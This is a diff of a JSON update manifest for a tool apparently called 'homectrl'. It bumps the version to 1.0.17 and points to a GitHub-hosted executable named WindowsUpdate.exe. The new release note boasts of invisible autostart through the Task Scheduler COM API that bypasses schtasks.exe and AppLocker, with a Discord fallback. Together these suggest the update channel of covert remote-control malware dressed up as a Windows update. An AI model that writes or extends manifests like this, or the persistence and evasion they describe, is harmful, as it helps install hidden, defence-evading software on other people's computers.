@@ -1,6 +1,6 @@
 ﻿{
-    "notes":  "Autostart diagnose: /autostart zeigt alle 3 methoden + owner. /autostart action:clean entfernt HKCU Run + legt Task neu an",
-    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.16/WindowsUpdate.exe",
-    "sha256":  "d79a775b0f0bd9974d2f4a09c8df246f465fc4358c8a6a19e7e9d889d549dab4",
-    "version":  "1.0.16"
+    "notes":  "Autostart via Task Scheduler COM API (invisible, bypasses schtasks.exe/AppLocker) + Discord 3s timeout fallback",
+    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.17/WindowsUpdate.exe",
+    "sha256":  "4ddeb829c0c0926915fb30a453adf9edae56932b223489deee70609035106368",
+    "version":  "1.0.17"
 }
